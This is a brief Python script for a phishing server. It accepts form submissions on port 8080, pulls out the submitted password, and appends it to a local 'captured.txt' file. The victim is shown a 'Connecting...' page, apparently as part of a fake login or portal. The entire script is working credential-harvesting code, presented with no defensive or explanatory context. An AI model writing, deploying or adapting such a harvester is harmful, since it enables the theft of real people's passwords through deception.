from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import os

class PhishingServer(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(length).decode('utf-8')
        parsed = urllib.parse.parse_qs(post_data)
        password = parsed.get("password", [""])[0]

        with open("../creds/captured.txt", "a") as f:
            f.write(f"Captured: {password}\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h2>Connecting...</h2>")

if __name__ == "__main__":
    os.makedirs("../creds", exist_ok=True)
    server = HTTPServer(('0.0.0.0', 8080), PhishingServer)
    print("[*] Listening for credentials...")
    server.serve_forever()

